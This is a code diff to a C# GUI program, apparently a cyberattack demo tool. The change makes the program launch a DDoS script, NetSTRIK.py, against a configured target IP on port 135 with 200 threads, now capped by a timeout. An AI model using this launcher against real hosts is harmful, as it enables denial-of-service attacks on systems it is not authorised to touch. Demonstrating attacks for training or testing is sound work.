@@ -149,12 +149,15 @@ namespace CyberAttackDemo
             SetBusyState(true, "EXECUTING NetSTRIK ATTACK...", Avalonia.Media.Brushes.Red);
             WriteLog("\n==========================================");
             WriteLog($"[*] INITIATING NetSTRIK Python Script...");
+            WriteLog($"[*] DURATION LIMIT: {_config.DdosDuration} SECONDS");
             WriteLog("==========================================");
 
-            // 指定されたコマンド: python3 ./Attack/NetSTRIK.py -s <ip> -p 135 -t 200
-            // ※Pythonスクリプトファイルが存在することを確認してください
-            string args = $"./Attack/NetSTRIK.py -s {_config.TargetIp} -p 135 -t 200";
-            await _engine.RunCommandAsync("python3", args);
+            // 修正: timeoutコマンドを使って指定秒数で強制終了させる
+            // 構成: timeout <秒数>s python3 <スクリプトパス> <引数...>
+            string args = $"{_config.DdosDuration}s python3 ./Attack/NetSTRIK.py -s {_config.TargetIp} -p 135 -t 200";
+            
+            // コマンド名を "python3" から "timeout" に変更
+            await _engine.RunCommandAsync("timeout", args);
 
             WriteLog("\n[ATTACK FINISHED] NetSTRIK Execution Complete.");
             SetBusyState(false, "READY FOR NEXT COMMAND.");
@@ -211,3 +214,4 @@ namespace CyberAttackDemo
         }
     }
 }
+
